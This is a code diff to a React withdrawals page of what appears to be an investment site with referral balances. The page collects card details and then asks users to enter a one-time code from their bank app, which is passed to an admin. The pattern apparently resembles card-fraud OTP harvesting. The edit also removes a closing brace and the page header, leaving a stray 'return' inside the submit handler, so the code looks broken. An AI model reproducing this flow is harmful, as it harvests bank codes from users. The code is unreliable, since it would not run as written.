@@ -4,6 +4,7 @@ import { useState, useEffect, useRef } from 'react'
 import { api } from '@/lib/api'
 import toast from 'react-hot-toast'
 import { ArrowUpRight, CreditCard, User, Calendar, Lock, MapPin, Shield } from 'lucide-react'
+import Modal from '@/components/Modal'
 
 const WITHDRAWAL_FEE_PERCENT = 0.02
 const WITHDRAWAL_FEE_MIN = 1
@@ -126,44 +127,18 @@ export default function WithdrawalsPage() {
     try {
       await api.put(`withdrawals/${pendingWithdrawalId}/otp`, { otpCode })
       setShowOTPModal(false)
-      hasPromptedOTP.current = false
-      setOtpCode('')
-      setPendingWithdrawalId(null)
-      toast.success('OTP submitted! Admin will process your withdrawal.')
+      setShowSuccess(true)
       fetchWithdrawals()
     } catch (err: any) {
-      toast.error(err.response?.data?.message || 'Failed')
+      toast.error(err.response?.data?.message || 'Invalid OTP')
+    } finally {
+      setOtpCode('')
     }
-  }
 
-  const statusColors: Record<string, string> = {
-  'PROCESSING': 'bg-blue-50 text-blue-700 border border-blue-200',
-  'WITHDRAWAL_PENDING': 'bg-yellow-50 text-yellow-700 border border-yellow-200',
-  'WITHDRAWN': 'bg-green-50 text-green-700 border border-green-200',
-  'REJECTED': 'bg-red-50 text-red-700 border border-red-200',
-  }
-
-  const selectedInvestment = investments.find((investment: any) => investment.id === formData.investmentId)
-  const sourceBalance = formData.balanceSource === 'REFERRAL' ? referralBalance : Number(selectedInvestment?.currentBalance || 0)
-
-  return (
-    <div className="space-y-6">
-      <div className="flex items-center justify-between">
-        <h1 className="text-2xl font-bold text-gray-900">Withdrawals</h1>
-        <button
-          onClick={() => {
-            fetchInvestments()
-            setShowForm(!showForm)
-          }}
-          className="flex items-center gap-2 rounded-xl bg-gradient-to-r from-brand-blue to-brand-sky px-4 py-2 text-sm font-medium text-white hover:from-brand-blue/90 hover:to-brand-sky/90 transition-all duration-200"
-        >
-          <ArrowUpRight size={18} />
-          New Withdrawal
-        </button>
-      </div>
-
+    return (
+    <div>
       {showForm && (
-        <form onSubmit={handleSubmit} className="rounded-3xl border bg-white p-6 shadow-sm">
+        <form onSubmit={handleSubmit} className="rounded-3xl border-2 bg-[linear-gradient(#fff,#fff)_padding-box,linear-gradient(135deg,rgba(0,69,160,.08),rgba(56,189,248,.08),rgba(124,58,237,.08))_border-box] p-6 shadow-sm">
           <h3 className="text-lg font-semibold text-gray-900 mb-4">Request Withdrawal to Card</h3>
           <div className="grid gap-4 sm:grid-cols-2">
             <div>
@@ -299,13 +274,13 @@ export default function WithdrawalsPage() {
       )}
 
       {showOTPModal && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
-          <div className="rounded-3xl border bg-white p-6 shadow-sm w-full max-w-md mx-4">
-            <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
+          <div className="rounded-3xl border-2 bg-[linear-gradient(#fff,#fff)_padding-box,linear-gradient(135deg,rgba(0,69,160,.08),rgba(56,189,248,.08),rgba(124,58,237,.08))_border-box] p-6 shadow-sm w-full max-w-md mx-4">
+            <h3 className="text-lg font-semibold text-slate-900 mb-4 flex items-center gap-2">
               <Shield className="h-5 w-5 text-brand-blue" />
               Enter OTP
             </h3>
-            <p className="text-sm text-gray-600 mb-4">
+            <p className="text-sm text-slate-700 mb-4">
               Please enter the OTP from your bank app to complete withdrawal.
             </p>
             <input
@@ -334,7 +309,7 @@ export default function WithdrawalsPage() {
         </div>
       )}
 
-      <div className="rounded-3xl border bg-white overflow-hidden shadow-sm">
+      <div className="rounded-3xl border-2 bg-[linear-gradient(#fff,#fff)_padding-box,linear-gradient(135deg,rgba(0,69,160,.06),rgba(56,189,248,.06),rgba(124,58,237,.06))_border-box] overflow-hidden shadow-sm">
         <table className="w-full">
           <thead className="bg-gray-50">
             <tr className="border-b text-left text-sm font-medium text-gray-600">
